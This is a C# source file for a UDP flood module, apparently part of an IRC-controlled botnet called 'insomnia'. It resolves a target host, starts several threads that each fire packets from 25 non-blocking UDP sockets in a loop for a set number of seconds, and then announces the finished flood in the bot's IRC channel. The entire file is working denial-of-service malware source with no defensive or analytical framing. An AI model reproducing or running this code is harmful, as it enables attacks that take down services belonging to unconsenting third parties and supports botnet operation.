using System;
using System.Collections.Generic;
using System.Text;
using System.Threading;
using System.Net;
using System.Net.Sockets;

namespace insomnia
{
    internal class UDP
    {
        private static ThreadStart[] j;
        private static Thread[] t;
        public static string host;
        public static int delay;
        private static IPEndPoint ipEo;
        public static int port;
        private static su[] L4Class;
        public static int sockets = 25;
        public static int threads = 5;
        public static int pSize = 256;
        public static bool isEnabled = false;

        public static void Start()
        {
            Thread u = new Thread(Begin);
            u.IsBackground = true;
            u.Start();
        }

        public static void Begin()
        {
            try
            {
                ipEo = new IPEndPoint(Dns.GetHostEntry(host).AddressList[0], port);
            }
            catch
            {
                ipEo = new IPEndPoint(IPAddress.Parse(host), port);
            }
            t = new Thread[threads];
            j = new ThreadStart[threads];
            L4Class = new su[threads];
            for (int i = 0; i < threads; i++)
            {
                L4Class[i] = new su(ipEo, sockets, pSize);
                j[i] = new ThreadStart(L4Class[i].Send);
                t[i] = new Thread(j[i]);
                t[i].Start();
            }

            Thread.Sleep(delay * 1000);
            if (isEnabled)
            {
                Stop();
                IRC.WriteMessage("UDP flood on" + IRC.ColorCode(" " + host) + " for" + IRC.ColorCode(" " + delay) + " seconds has finished.", Config._mainChannel());
            }
        }

        public static void Stop()
        {
            isEnabled = false;
        }

        private class su
        {
            private IPEndPoint ipEo;
            private int pSize;
            private Socket[] s;
            private int ss;

            public su(IPEndPoint ipEo, int ss, int pSize)
            {
                this.ipEo = ipEo;
                this.ss = ss;
                this.pSize = pSize;
            }

            public void Send()
            {
                int num;
                byte[] buffer;

                while (isEnabled)
                {
                    buffer = new byte[this.pSize];
                    try
                    {
                        this.s = new Socket[this.ss];
                        for (num = 0; num < this.ss; num++)
                        {
                            this.s[num] = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
                            this.s[num].Blocking = false;
                            this.s[num].SendTo(buffer, this.ipEo);
                        }
                        Thread.Sleep(100);
                        for (num = 0; num < this.ss; num++)
                        {
                            if (this.s[num].Connected)
                            {
                                this.s[num].Disconnect(false);
                            }
                            this.s[num].Close();
                            this.s[num] = null;
                        }
                        this.s = null;
                    }
                    catch
                    {
                        for (num = 0; num < this.ss; num++)
                        {
                            try
                            {
                                if (this.s[num].Connected)
                                {
                                    this.s[num].Disconnect(false);
                                }
                                this.s[num].Close();
                                this.s[num] = null;
                            }
                            catch
                            {
                            }
                        }
                    }
                }

                // Cleanup
                for (num = 0; num < this.ss; num++)
                {
                    try
                    {
                        if (this.s[num].Connected)
                        {
                            this.s[num].Disconnect(false);
                        }
                        this.s[num].Close();
                        this.s[num] = null;
                    }
                    catch
                    {
                    }
                }
            }
        }
    }
}
